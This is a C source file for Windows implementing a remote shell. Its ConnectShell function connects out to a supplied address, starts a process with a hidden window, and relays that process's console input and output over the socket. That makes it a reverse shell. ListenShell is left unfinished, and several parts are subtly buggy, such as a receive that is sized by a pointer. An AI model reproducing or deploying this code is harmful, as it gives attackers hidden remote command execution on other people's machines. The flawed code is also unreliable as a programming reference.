#include "RemoteShell.h"

int initialization()
{
    WSADATA wsadata;

    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0)
    {
        printf("[-] WSAStartup failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }

    return 1;
}

int ListenShell(char *path, SOCKADDR_IN sockaddr)
{
    SOCKET sock = NULL;
    
    if (initialization() == 0)
    {
        return 0;
    }

    sock = socket(sockaddr.sin_family, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET)
    {
        printf("[-] Create socket failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }
}

int ConnectShell(char *path, SOCKADDR_IN sockaddr)
{
    IPC_PIPE IpcPipe;
    SOCKET sock = NULL;
    
    if (initialization() == 0)
    {
        return 0;
    }

    sock = socket(sockaddr.sin_family, SOCK_STREAM, IPPROTO_TCP);

    if (sock == INVALID_SOCKET)
    {
        printf("[-] Create socket failed!\n");
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }

    if (connect(sock, (const struct sockaddr *)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR)
    {
        printf("[-] %s:%d Connect failed!\n", inet_ntoa(sockaddr.sin_addr), htons(sockaddr.sin_port));
        printf("[+] GetLastError : %d\n", GetLastError());
        return 0;
    }

    HANDLE hEvent = WSACreateEvent();
    WSAEventSelect(sock, hEvent, FD_READ | FD_CLOSE);

    HANDLE hProcess = ProcessStart(path, &IpcPipe);

    DWORD dwOut = 0, dwRead = 0;
    char Buffer[1024];

    while (TRUE)
    {
        ZeroMemory(Buffer, sizeof(Buffer));
        if (PeekNamedPipe(IpcPipe.hParentRead, NULL, 0, NULL, &dwOut, NULL) && dwOut > 0)
        {
            ReadFile(IpcPipe.hParentRead, Buffer, sizeof(Buffer), &dwRead, NULL);
            Buffer[dwRead] = NULL;
            DataSend(sock, Buffer);
        }

        WSANETWORKEVENTS NetworkEvents = { 0, };
        if (WSAEnumNetworkEvents(sock, hEvent, &NetworkEvents) == SOCKET_ERROR)
        {
            printf("[-] WSAEnumNetworkEvents failed!\n");
            printf("[+] GetLastError : %d\n", GetLastError());
            continue;
        }

        if (NetworkEvents.lNetworkEvents & FD_READ)
        {
            DataRecv(sock, Buffer);
            WriteFile(IpcPipe.hParentWrite, Buffer, strlen(Buffer), NULL, NULL);
        }
        else if (NetworkEvents.lNetworkEvents & FD_CLOSE)
        {
            printf("[*] Socket closed\n");
            break;
        }

        if (WaitForSingleObject(hProcess, 0) == 0)
        {
            printf("[*] Process terminated!\n");
            DataSend(sock, "[*] Process terminated!");
            break;
        }
    }

    TerminateProcess(hProcess, 0);
    closesocket(sock);
    CloseHandle(hEvent);
}

HANDLE ProcessStart(char *path, IPC_PIPE *IpcPipe)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    ZeroMemory(&sa, sizeof(SECURITY_ATTRIBUTES));
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    CreatePipe(&IpcPipe->hChildRead, &IpcPipe->hParentWrite, &sa, 0);
    CreatePipe(&IpcPipe->hParentRead, &IpcPipe->hChildWrite, &sa, 0);

    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = IpcPipe->hChildRead;
    si.hStdOutput = IpcPipe->hChildWrite;
    si.hStdError = IpcPipe->hChildWrite;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, path, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi) == 0)
    {
        printf("[-] Process start failed!\n");
        printf("[+] GetLastError : %d\n");
        return 1;
    }

    CloseHandle(pi.hThread);

    return pi.hProcess;
}

int DataSend(SOCKET s, char *Buffer)
{
    return send(s, Buffer, strlen(Buffer), 0);
}

int DataRecv(SOCKET s, char *Buffer)
{
    return recv(s, Buffer, sizeof(Buffer), 0);
}